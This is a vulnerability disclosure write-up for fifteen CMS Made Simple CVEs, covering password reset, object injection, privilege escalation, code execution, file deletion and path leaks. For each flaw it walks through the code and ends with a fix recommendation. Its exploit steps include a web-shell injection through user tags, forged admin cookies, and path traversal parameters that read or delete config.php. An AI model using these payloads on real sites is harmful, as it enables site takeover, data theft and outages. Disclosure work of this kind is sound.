---
layout: post
title: Cms Made Simple <= 2.2.7 Multiple Vulnerability
categories: articles
---

<p align="right" class="date">{{ page.date | date_to_string }} - todaro</p>

## General description：

1. CMS Made Simple (CMSMS) <=2.2.6 contains admin password reset vulnerability(CVE-2018-10081)

2. CMS Made Simple (CMSMS) <=2.2.6 contains PHP object injection(CVE-2018-10085)

3. CMS Made Simple (CMSMS) <=2.2.6 contains the privilege escalation vulnerability from ordinary user to admin user(CVE-2018-10084)

4. CMS Made Simple (CMSMS) <=2.2.7 contains arbitrary code execution vulnerability in the admin dashboard(CVE-2018-10086)

5. CMS Made Simple (CMSMS) <=2.2.7 contains any file deletion vulnerability in the admin dashboard(CVE-2018-10083)

6. CMS Made Simple (CMSMS) <=2.2.7 contains web Site physical path leakage Vulnerability(CVE-2018-10082)

7. CMS Made Simple (CMSMS) 2.2.7 contains the privilege escalation vulnerability from ordinary user to admin user(CVE-2018-10519)

8. CMS Made Simple (CMSMS) <=2.2.7 "module import" operation in the admin dashboard contains remote code execution vulnerabilities(admin user)(CVE-2018-10517)

9. CMS Made Simple (CMSMS) <=2.2.7 "file unpack" operation in the admin dashboard contains remote code execution vulnerability(admin user)(CVE-2018-10515)

10. CMS Made Simple (CMSMS) <=2.2.7 "file view" operation in the admin dashboard contains sensitive information disclosure vulnerability(ordinary user)(CVE-2018-10522)

11. CMS Made Simple (CMSMS) <=2.2.7 "file rename" operation in the admin dashboard contains sensitive information disclosure vulnerability that can cause DOS(admin user)(CVE-2018-10516)

12. CMS Made Simple (CMSMS) <=2.2.7 "module remove" operation in the admin dashboard contains arbitrary file deletion vulnerability that can cause DOS(admin user)(CVE-2018-10520)

13. CMS Made Simple (CMSMS) <=2.2.7 "file delete" operation in the admin dashboard contains arbitrary file deletion vulnerability that can cause DOS(admin user)(CVE-2018-10518)

14. CMS Made Simple (CMSMS) <=2.2.7 "file move" operation in the admin dashboard contains arbitrary file movement vulnerability that can cause DOS(admin user)(CVE-2018-10521)

15. CMS Made Simple (CMSMS) <=2.2.7 contains web Site physical path leakage Vulnerability(CVE-2018-10523)

**Environment**: apache/php 7.0.12/cms made simple 2.2.6 and cms made simple 2.2.7(update)

## 0x01 Admin password reset vulnerability (<=2.2.6)

at /admin/login.php

<img src="https://i.loli.net/2018/12/06/5c07f6b66d409.png">

line 129 calls the find_recovery_user function, passing in the `changepwhash` value if no null is returned, the password reset process will be entered

in the find_recovery_user function

<img src="https://i.loli.net/2018/12/06/5c07f6d370a38.png">

on line 78, the password reset hash of all admin dashboard users is obtained directly from the database, and then compared with the value of `changepwhash` submitted by the user. If they are equal, the user is returned, otherwise null is returned.

the problem here is that the hash of the password reset by the admin dashboard user is fixed, and the hash check is a weak type comparison, so there is the possibility of a password reset.

for example, the admin user's password reset hash starts with 0e.

<img src="https://i.loli.net/2018/12/06/5c07f6d157cee.png">

<img src="https://i.loli.net/2018/12/06/5c07f6d4193f8.png">

you will see `0e123456 == 0e445678` but `0e123456 !== 0e445678`

To sum up: because the checked hash is not generated randomly everytime, it is always fixed, and because the hash check uses ==, so the hacker does not need to initiate the mailbox to obtain the hash to perform admin dashboard user password reset (hash starts with 0e)

vulnerability fix recommendations: use `===` instead of `==`, hash should be dynamically generated

## 0x02 PHP object injection (<=2.2.6)

in the _get_data function of \lib\classes\internal\class.LoginOperations.php

<img src="https://i.loli.net/2018/12/06/5c07f6d762b22.png">

line 117 gets the value of `$_COOKIE[$this->_loginkey]` by deserialization this function will be called when logging in the admin dashboard then the value of `$this->_loginkey` is fixed, so the next step is to construct the deserialization exploit chain.

there is a __destruct function in class Smarty_Internal_Template of \lib\smarty\sysplugins\smarty_internal_template.php

<img src="https://i.loli.net/2018/12/06/5c07f6d667536.png">

line 689 calls the releaseLock function of \lib\smarty\sysplugins\smarty_internal_cacheresource_file.php in this function

<img src="https://i.loli.net/2018/12/06/5c07f6d6661bf.png">

line 273 calls the unlink function to delete lock_id, so control lock_id to delete any file

create a new file test.txt in the website root directory

<img src="https://i.loli.net/2018/12/06/5c07f6d822649.png">

<img src="https://i.loli.net/2018/12/06/5c07f8385d236.png">

first specify the file to delete in poc.php then run poc.php to write the returned contents to unser.py line 55

<img src="https://i.loli.net/2018/12/06/5c07f8387b89e.png">

then execute python unser.py

<img src="https://i.loli.net/2018/12/06/5c07f83ece194.png">

the test.txt file has been deleted after execution

vulnerability fix recommendations: use the json_decode function instead of the unserialize function

## 0x03 The privilege escalation from ordinary user to admin user (<=2.2.6)

call the check_login function in line 35 of /admin/index.php

<img src="https://i.loli.net/2018/12/06/5c07f8388ad70.png">

in \lib\page.functions.php, line 88 calls the get_userid function

<img src="https://i.loli.net/2018/12/06/5c07f83a7acf6.png">

in \lib\page.functions.php, line 43 calls the get_effective_uid function

<img src="https://i.loli.net/2018/12/06/5c07f83d269c1.png">

in \lib\classes\internal\class.LoginOperations.php, line 183 calls the _get_data function

<img src="https://i.loli.net/2018/12/06/5c07f83bd9add.png">

on line 182, if the data exists and both `eff_uid` and `eff_uid` exist in the data, the value of `eff_uid` is returned (`point of problem 1`).

in the _get_data function of \lib\classes\internal\class.LoginOperations.php

<img src="https://i.loli.net/2018/12/06/5c07f83d04e20.png">

line 106 gets data from `$_COOKIE[$this->_loginkey]`

`$this->_loginkey` comes from `md5(__FILE__.__CLASS__.CMS_VERSION)` the admin dashboard user can get the value in the cookie after logging in, and can also guess it directly

`__FILE__` -->`" absolute path"\lib\classes\internal\class.LoginOperations.php`(refer to Appendix 1)

`__CLASS__` -->`CMSMS\LoginOperations`(fixed value)

`CMS_VERSION` -->`2.2.6`(fixed value,or 2.2.5/2.2.4/...)

<img src="https://i.loli.net/2018/12/06/5c07f83e73ea6.png">

on line 115, anti-counterfeiting verification is performed on the data, but there is a problem with the verification method(`point of problem 2`) (`refer to Appendix 2`).

line 117 gets the value of `$_COOKIE[$this->_loginkey]` by deserialization

<img src="https://i.loli.net/2018/12/06/5c07f83d9ecc1.png">

on line 125, the _check_passhash function is called to verify the `id` and `cksum` values in the data

in the _check_passhash function

<img src="https://i.loli.net/2018/12/06/5c07f9c242e02.png">

line 56 obtains the user's corresponding password through uid, merges some other parameters to serialize, and then sha1 encrypts it. finally, the cksum value submitted by the user is checked,if not equal, FALSE is returned, and the verification fails.

To sum up: the key to exploiting the vulnerability is to falsify the `eff_uid` value in `$_COOKIE[$this->_loginkey]` to 1 (the admin user's id), after which the cksum value is validated, and the data's anti-forgery check is bypassed!

Exploits: I wrote a vulnerability verification script. simply fill in the relevant parameters and you can let the admin dashboard ordinary users upgrade to the admin user.

python poc.py

<img src="https://i.loli.net/2018/12/06/5c07f9d016e48.png">

open /admin/index.php with the browser corresponding to user_agent in poc and jump to /admin/login.php

clear all cookies

then add the cookies generated by poc

-->`733200e27b06fbee203116934285f533`
eb3b2b96e832bf7bf56a80f18a512857c5286473::YTo1OntzOjg6InVzZXJuYW1lIjtzOjU6ImFkbWluIjtzOjc6ImVmZl91aWQiO2k6MTtzOjEyOiJlZmZfdXNlcm5hbWUiO047czozOiJ1aWQiO2k6MjtzOjU6ImNrc3VtIjtzOjQwOiI4MzZjOGVhZDIwM2EyMTgwY2ExYmNlMjczOGU5NzBlODkzMjBhOTEyIjt9

-->`_sk_` aabbcc

<img src="https://i.loli.net/2018/12/06/5c07f9cf5163e.png">

<img src="https://i.loli.net/2018/12/06/5c07f9c291f52.png">

then request /admin/index.php

<img src="https://i.loli.net/2018/12/06/5c07f9c9ed837.png">

successfully become a admin user!

Vulnerability fix recommendations: use a strong data encryption method.

## 0x04 Arbitrary code execution in the admin dashboard (<=2.2.7)

in \admin\editusertag.php

<img src="https://i.loli.net/2018/12/06/5c07f9c36fbbc.png">

line 93, execute the command directly using the eval function

it was originally intended to place $code in testfunctionXXX(){}, but it was possible to jump out of the testfunctionXXX to execute arbitrary code because of lax filtering.

`$code` comes from `$code = $record['code'];` and `$record['code'] = trim($_POST['code']);`

<img src="https://i.loli.net/2018/12/06/5c07f9c371475.png">

lines 80-81 limit the characters

<img src="https://i.loli.net/2018/12/06/5c07f9c4c18c0.png">

<img src="https://i.loli.net/2018/12/06/5c07f9c37f30d.png">

line 105 stores `$code` and calls SetUserTag function to write to the database

in the function CallUserTag of \lib\classes\class.usertagoperations.inc.php

<img src="https://i.loli.net/2018/12/06/5c07f9c5e2b84.png">

line 285 calls call_user_func_array to execute the stored function code

go to /admin/listusertags.php?sk=2e70dc0836332261d5c select a tag to edit and add as follows

<img src="https://i.loli.net/2018/12/06/5c07fae0be955.png">

}if(isset($_GET['action'])) @assert($_GET['action']);/*

then visit /index.php?action=phpinfo() the variable `action` is the command to be executed

<img src="https://i.loli.net/2018/12/06/5c07faeb4f00d.png">

Vulnerability fix recommendations: filtering the data submitted by the user

## 0x05 Any file deletion in the admin dashboard (<=2.2.7)

in \modules\FilePicker\action.ajax_cmd.php

<img src="https://i.loli.net/2018/12/06/5c07fade48e44.png">

line 15 gets the value of the `cwd` variable via post and removes the <> character in it

<img src="https://i.loli.net/2018/12/06/5c07fae03d8a3.png">

line 28 calls the is_relative function from \modules\FilePicker\lib\class.PathAssistant.php

<img src="https://i.loli.net/2018/12/06/5c07fae52b3b1.png">

line 65 calls the is_relative_to function in this function, the startswith function is called to compare the address from the value of the `cwd` variable and the absolute address of the default.

<img src="https://i.loli.net/2018/12/06/5c07fae207fd2.png">

<img src="https://i.loli.net/2018/12/06/5c07fae209a0b.png">

line 13 gets the value of the `cmd` variable via post and filters it line 14 gets the value of the `val` variable via post

<img src="https://i.loli.net/2018/12/06/5c07fae9eefba.png">

line 40 When the `cmd` value is 'del', the delete operation is called

To sum up: the default directory is /uploads/. to delete files from other directories, you can use /../ in the variable val.

<img src="https://i.loli.net/2018/12/06/5c07fae50e254.png">

<img src="https://i.loli.net/2018/12/06/5c07faeb40a00.png">

<img src="https://i.loli.net/2018/12/06/5c07fbe92da50.png">

find a deletable file, click x and use burp to capture data

-->change the value of `val` to `/../$directory/$file`

<img src="https://i.loli.net/2018/12/06/5c07fbe3b6f51.png">

/lib/test.php(a file created for testing) will be deleted

once the important file is deleted, the website can not run properly

Vulnerability fix recommendations: filtering the data submitted by the user

#### Appendix 1

## 0x06 Web Site physical path leakage Vulnerability

the following links can get the absolute path to the site /index.php?page=-100ssssss

<img src="https://i.loli.net/2018/12/06/5c07fbe9906ca.png">

/index.php?mact=Search%2Ccntnt01%2Cdosearch%2C0&meb92freturnid=31&meb92fsearchinput=aaa&submit=Submit

<img src="https://i.loli.net/2018/12/06/5c07fbe49fc3e.png">

/admin/header.php

<img src="https://i.loli.net/2018/12/06/5c07fbe7ce19d.png">

/admin/footer.php /lib/tasks/class.ClearCache.task.php /lib/tasks/class.CmsSecurityCheck.task.php ......

#### Appendix 2

$tmp = [ md5(FILE),\cms_utils::get_real_ip(),$_SERVER['HTTP_USER_AGENT'].CMS_VERSION ];

$salt = sha1(serialize($tmp));

check:sha1( $parts[1].$salt ) != $parts[0] that is to let sha1( $parts[1].$salt ) == $parts[0]

the FILE in md5(FILE) can be obtained from Appendix 1, so it is a fixed value

\cms_utils::get_real_ip() gets the client ip, which is also a fixed value

$_SERVER['HTTP_USER_AGENT'] gets the client browser user_agent, which is also a fixed value

CMS_VERSION is also a fixed value

therefore, the data to be verified against data falsification is a fixed value and can be obtained directly, so this verification can be bypassed.

## 0x07 The privilege escalation from ordinary user to admin user (2.2.7)

The previous CVE(http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-10084) existed in cmsms version <=2.2.6,and the authentication method was updated in the latest 2.2.7 version. However, there is still a privilege escalation vulnerability from ordinary user to admin user.

Call the check_login function in line 35 of /admin/index.php

<img src="https://i.loli.net/2018/12/06/5c0801efb63f4.png">

In \lib\page.functions.php, line 88 calls the get_userid function

<img src="https://i.loli.net/2018/12/06/5c0801f149bc7.png">

In \lib\page.functions.php, line 43 calls the get_effective_uid function

<img src="https://i.loli.net/2018/12/06/5c0801f38d4a7.png">

In \lib\classes\internal\class.LoginOperations.php, line 183 calls the _get_data function

<img src="https://i.loli.net/2018/12/06/5c0801f230552.png">

On line 182, if the data exists and both eff_uid and eff_uid exist in the data, the value of eff_uid is returned (`problem 1`).

(`The following is the function updated in version 2.2.7`)

In the _get_data function of \lib\classes\internal\class.LoginOperations.php

<img src="https://i.loli.net/2018/12/06/5c0801f3141fa.png">

Line 106 gets data from `$_COOKIE[$this->_loginkey]`

`$this->_loginkey` comes from `sha1( CMS_VERSION.$this->_get_salt() );`

The admin dashboard users can get the value in the cookie after logging in, and can also be guessed directly

`CMS_VERSION` -->2.2.7 (fixed value)

get_salt function is as follows

<img src="https://i.loli.net/2018/12/06/5c0801f342088.png">

Line 51 calls \cms_siteprefs::get(__CLASS__) to get the value of `$salt`

__CLASS__ is a fixed value: CMSMS\LoginOperations

In the \cms_siteprefs::get function of \lib\classes\class.cms_siteprefs.php

<img src="https://i.loli.net/2018/12/06/5c0801f220555.png">

Line 86 calls the global_cache::get function, the current __CLASS__ is a fixed value: cms_siteprefs

In the global_cache::get function of \lib\classes\internal\class.global_cache.php

<img src="https://i.loli.net/2018/12/06/5c0801f3ebb0d.png">

Line 23 calls the _load function In the _load function

<img src="https://i.loli.net/2018/12/06/5c0801f39ad96.png">

Line 76 calls the get function of \lib\classes\class.cms_filecache_driver.php

<img src="https://i.loli.net/2018/12/06/5c0801f2e95c3.png">

Line 146 calls the _get_filename function to get the name of the last cached file

Line 147 reads the value of the cache file through the _read_cache_file function

<img src="https://i.loli.net/2018/12/06/5c08cf5d619db.png">

You can see that the parameters that make up the cache file name are both fixed and guessable (`problem 2`)

And the files in the /tmp/ directory are all directly accessible via the web (`problem 3`)

And the value read from the cache file is also the encrypted value to be used later in the data tamper verification. So we can get this value by guessing the file name and then reading the cache file directly.

Back to _get_data function

<img src="https://i.loli.net/2018/12/06/5c08cf5e1a20f.png">

Line 115 gets the value in the cookie and is divided into `part0::part1`

Line 118 checks the data to prevent data from being tampered with

If the value of `part0` is not equal to `sha1 ($salt.part1)` cmsms will not continue to execute the code

We already mentioned that this `$salt` value can be obtained, so we can bypass this check

The line 119 performs base64decode processing on the `part1` value and then processes it with json_decode (<2.2.7 version uses unserialize function, which also leads to the PHP object injection vulnerability).

<img src="https://i.loli.net/2018/12/06/5c08cf6078376.png">

Line 128 also checks the `hash` in the data. This value is related to the user's password, so we need to have a ordinary user account in the admin dashboard.

To sum up: the key to exploiting the vulnerability is to falsify the `eff_uid` value in `$_COOKIE[$this->_loginkey]` to 1 (the admin user's id), and then bypass the data's anti-counterfeiting verification.

Exploits: I wrote a vulnerability verification script. simply fill in the relevant parameters and you can let the admin dashboard ordinary users upgrade to the admin user.

python cmsms_2_2_7_poc.py

<img src="https://i.loli.net/2018/12/06/5c08cf6c73029.png">

Using browser to open /admin/index.php will jump to /admin/login.php

Emptying cookies

Then add the cookie generated by the POC

{% highlight javascript %}

8624fce6d211b248d0ec7f93c4797b3ad80e8308
-->4a81ada13ba84ebaa0956bb1b287d333a605d424::eyJ1c2VybmFtZSI6ICJhZG1pbiIsICJlZmZfdWlkIjogMSwgImVmZl91c2VybmFtZSI6IG51bGwsICJ1aWQiOiAyLCAiaGFzaCI6ICIkMnkkMTAkL3d0c2poZ2ZmM25kOG5oWkIxdGVsTzdJZFFKR1o2L0htLnZjQy56aE8xTE01bko1Z1FMOHUifQ==

__c
-->512919d4312874cba5d

{% endhighlight %}

<img src="https://i.loli.net/2018/12/06/5c08cf663dc8c.png">

<img src="https://i.loli.net/2018/12/06/5c08cf61c675a.png">

Then revisit /admin/index.php

<img src="https://i.loli.net/2018/12/06/5c08cf67089f4.png">

Successfully become a admin user!

Vulnerability fix recommendations: Modify the user authentication logic and also restrict the direct access to the tmp directory.

## 0x08 CMS Made Simple (CMSMS) <=2.2.7 "module import" operation in the admin dashboard contains remote code execution vulnerabilities(admin user)

In \modules\ModuleManager\action.local_import.php

<img src="https://i.loli.net/2018/12/06/5c08cf5bd3ef4.png">

Line 23 calls the ExpandXMLPackage function of \lib\classes\class.moduleoperations.inc.php

This function will call xml to read the contents of the file

<img src="https://i.loli.net/2018/12/06/5c08cf67d51bd.png">

This function reads the value of as the file name Read the value of as the contents of the file Then generate the file

To sum up: the whole process, CMSMS does not restrict the file type in the process of generating files, resulting in hackers can generate executable .PHP files.

Exploits: Create a test.xml first

<img src="https://i.loli.net/2018/12/06/5c08cf5cd4011.png">

Enter

<img src="https://i.loli.net/2018/12/06/5c08d0af4669f.png">

Click on "Import Module" operation and select test.xml Visit /modules/test/test.php after submitting

<img src="https://i.loli.net/2018/12/06/5c08d0b1dd917.png">

Vulnerability fix recommendations: This may be a function rather than a vulnerability for developers. But from the website security point of view, I still recommend that developers should modify this function: after all the module code is uploaded to the server via FTP(rather than by importing xml and automatically generating a file), the admin can choose to install the module.The consideration for this is that the admin is sure to have permission to upload code via FTP, but the hackers do not, so the security of the website is guaranteed.

## 0x09 CMS Made Simple (CMSMS) <=2.2.7 "file unpack" operation in the admin dashboard contains remote code execution vulnerability(admin user)

In the \modules\FileManager\action.fileaction.php file

<img src="https://i.loli.net/2018/12/06/5c08d0afc5361.png">

Enter the decompression process when there is a m1_fileactionunpack parameter or its value is unpack.

Call \modules\FileManager\action.unpack.php

<img src="https://i.loli.net/2018/12/06/5c08d0b046834.png">

Line 25 gets the name of the file to extract

Line 35 calls the extract function of class EasyArchive

In the extract function of \modules\FileManager\easyarchives\EasyArchive.class.php

<img src="https://i.loli.net/2018/12/06/5c08d0afd4ec9.png">

Line 165 determines that the file is a zip archive Line 168 decompresses the file directly

To sum up: you can see that the file in the compressed package is not judged in the whole process, so if the .php file is included in the compressed package, it will be released to the server directory after the decompression, causing the code to execute!

Exploits: Prepare a test.php file first

Content is `<?php phpinfo();?>`

Compress it into test.zip

<img src="https://i.loli.net/2018/12/06/5c08d0afb18ce.png">

Enter

<img src="https://i.loli.net/2018/12/06/5c08d0afd5407.png">

Upload test.zip file

Select test.zip and select "Unpack" operation

<img src="https://i.loli.net/2018/12/06/5c08d0b287938.png">

Will generate test.php in the current directory

<img src="https://i.loli.net/2018/12/06/5c08d0b260b0b.png">

Access the file, the php file is executed

<img src="https://i.loli.net/2018/12/06/5c08d0b2d8b6c.png">

Vulnerability fix recommendations: when decompressing a file, determine the file type and limit the .php file to be uncompressed to the server.

## 0x10 CMS Made Simple (CMSMS) <=2.2.7 "file view" operation in the admin dashboard contains sensitive information disclosure vulnerability(ordinary user)

In \modules\FileManager\action.view.php

<img src="https://i.loli.net/2018/12/06/5c08d2423bf9e.png">

Line 12 gets the value of file and handles it with the base64decode function

Line 13 gets the absolute address of the file

Line 14 determines that the file exists

<img src="https://i.loli.net/2018/12/06/5c08d2423b9d9.png">

Line 30 gets the contents of the file

To sum up: the whole process, after obtaining the file name submitted by the user, CMSMS only carries out the identification of the file existence, does not restrict the directory, and does not judge whether the user is the admin,so any ordinary user in the admin dashboard can read any file content of the website.

Exploits: Use admin dashboard ordinary user test1 to log in

Then request the following URL (replace the value of __c with your own value, base64decode('Li5cY29uZmlnLnBocA==') is ..\config.php)


{% highlight javascript %}

/admin/moduleinterface.php?mact=FileManager,m1_,view,0&__c=b3d2a517e18bf23a60b&m1_ajax=1&showtemplate=false&m1_file=Li5cY29uZmlnLnBocA==

{% endhighlight %}

Click "view-source" to see the contents of /config.php

<img src="https://i.loli.net/2018/12/06/5c08d244ba0a3.png">

## 0x11 CMS Made Simple (CMSMS) <=2.2.7 "file rename" operation in the admin dashboard contains sensitive information disclosure vulnerability that can cause DOS(admin user)

In \modules\FileManager\action.fileaction.php

<img src="https://i.loli.net/2018/12/06/5c08d24331809.png">

Enter the file rename process when m1_fileactionrename parameter exists or its value is rename.

Call \modules\FileManager\action.rename.php

<img src="https://i.loli.net/2018/12/06/5c08d2475369d.png">

Line 31 verifies the new file name and cannot contain characters such as .., /, \, php to prevent .php file generation.

Line 40 gets the file name to be renamed, and $oldname comes from line 26

<img src="https://i.loli.net/2018/12/06/5c08d243311e6.png">

`$oldname` is handled by the decodefilename function, but this function simply performs a base64decode on the characters without any filtering

To sum up: hackers can move /config.php across directories to the /upload/ directory, causing websites to be inaccessible(DOS) and sensitive database information disclosure.

Exploits: Enter

<img src="https://i.loli.net/2018/12/06/5c08d244cca6b.png">

Just select a file, click on the "Rename" operation, and then use burp to grab packets

<img src="https://i.loli.net/2018/12/06/5c08d249a41ee.png">

Modify the value of `&m1_selall[]` to `Li4vY29uZmlnLnBocA==` Add `&m1_newname=test`

<img src="https://i.loli.net/2018/12/06/5c08d2477a1f8.png">

Then submit the request

/config.php has been moved to the /upload/ directory and renamed test

<img src="https://i.loli.net/2018/12/06/5c08d2fed3939.png">

And the site cannot be accessed(DOS) because it lacks the config.php configuration file

<img src="https://i.loli.net/2018/12/06/5c08d2fe60b53.png">

## 0x12 CMS Made Simple (CMSMS) <=2.2.7 "module remove" operation in the admin dashboard contains arbitrary file deletion vulnerability that can cause DOS(admin user)

In \modules\ModuleManager\action.local_remove.php

<img src="https://i.loli.net/2018/12/06/5c08d2ffb7ded.png">

Line 11 get the absolute address of the directory to delete

Line 13 calls recursive_delete function for recursive file deletion

<img src="https://i.loli.net/2018/12/06/5c08d300a7194.png">

To sum up: hackers can delete /lib/ all files across directories, causing websites to be inaccessible(DOS).

Exploits: Enter

<img src="https://i.loli.net/2018/12/06/5c08d2ff41b41.png">

Just select a module, click on the "Remove" operation, and then use burp to grab packets

<img src="https://i.loli.net/2018/12/06/5c08d2fff1abf.png">

Modify `m1_mod` to `..\test` to delete all files under /test/ (the directories and files are created for testing)

<img src="https://i.loli.net/2018/12/06/5c08d300cdf0f.png">

## 0x13 CMS Made Simple (CMSMS) <=2.2.7 "file delete" operation in the admin dashboard contains arbitrary file deletion vulnerability that can cause DOS(admin user)

In \modules\FileManager\action.fileaction.php

<img src="https://i.loli.net/2018/12/06/5c08d300a6464.png">

Enter the file deletion process when there is a m1_fileactiondelete parameter or its value is delete.

Call \modules\FileManager\action.delete.php

<img src="https://i.loli.net/2018/12/06/5c08d3004bc36.png">

Line 17 gets the file name and calls the base64decode function to decode

<img src="https://i.loli.net/2018/12/06/5c08d3004c252.png">

Line 29 gets the absolute address of the file

<img src="https://i.loli.net/2018/12/06/5c08d3f355e29.png">

Line 30 determines if the file exists

Line 32 determines whether the file is writable

Lines 37-43 determine that it is a directory and the directory is not empty

<img src="https://i.loli.net/2018/12/06/5c08d3f3031ed.png">

Line 57 deletes the file

To sum up: the whole process, after getting the file name submitted by the user, CMSMS will use base64decode function to decode it, and then only judge the existence of the file and the file can be written,the hacker can delete arbitrary files and cause dos.

Exploits: Enter

<img src="https://i.loli.net/2018/12/06/5c08d3f354353.png">

<img src="https://i.loli.net/2018/12/06/5c08d3f36a0ff.png">

Just select a file, click on the "Delete" operation, and then use burp to grab packets

<img src="https://i.loli.net/2018/12/06/5c08d3f3557be.png">

Add `&m1_submit=submit`

Modify `m1_selall[]` to `Li5cbGliXHRlc3QucGhw`

Submit the request, the \lib\test.php(files created for testing) file will be deleted

## 0x14 CMS Made Simple (CMSMS) <=2.2.7 "file move" operation in the admin dashboard contains arbitrary file movement vulnerability that can cause DOS(admin user)

In \modules\FileManager\action.fileaction.php

<img src="https://i.loli.net/2018/12/06/5c08d3f386729.png">

Enter the file move process when there is a m1_fileactionmove parameter or its value is move.

Call \modules\FileManager\action.move.php

<img src="https://i.loli.net/2018/12/06/5c08d3f32bab9.png">

<img src="https://i.loli.net/2018/12/06/5c08d3f35495d.png">

Get the file name processed by the base64decode function

<img src="https://i.loli.net/2018/12/06/5c08d3f32c10f.png">

<img src="https://i.loli.net/2018/12/06/5c08d3f354eff.png">

Get the destination directory and determine the file write permissions

<img src="https://i.loli.net/2018/12/06/5c08d4d19382b.png">

Judging the source file exists and the source file is readable

<img src="https://i.loli.net/2018/12/06/5c08d4d09d689.png">

Line 85 directly renames the file

To sum up: the whole process, after getting the file name submitted by the user, CMSMS will use base64decode function to decode it, and then only judge the existence of the file and the file readable,hackers can move /config.php to other directories resulting in website DOS.

Exploits: Enter

<img src="https://i.loli.net/2018/12/06/5c08d69b35ac8.png">

Just select a file, click on the "Move" operation, and then use burp to grab packets

<img src="https://i.loli.net/2018/12/06/5c08d4d4a0b8c.png">

Modify `m1_selall=` to `m1_selall[]=Li5cY29uZmlnLnBocA==`

`m1_destdir=/NCleanBlue`

Submit the request, /config.php becomes /upload/config.php

Request /index.php and display it as follows

<img src="https://i.loli.net/2018/12/06/5c08d4d192b1e.png">

## 0x15 CMS Made Simple (CMSMS) <=2.2.7 contains web Site physical path leakage Vulnerability

the following links can get the absolute path to the site

/modules/DesignManager/action.ajax_get_templates.php

<img src="https://i.loli.net/2018/12/06/5c08d4d303b23.png">

/modules/DesignManager/action.ajax_get_stylesheets.php

<img src="https://i.loli.net/2018/12/06/5c08d4d475786.png">

/modules/FileManager/dunzip.php

<img src="https://i.loli.net/2018/12/06/5c08d4d3868bb.png">

/modules/FileManager/untgz.php

<img src="https://i.loli.net/2018/12/06/5c08d4d4603b2.png">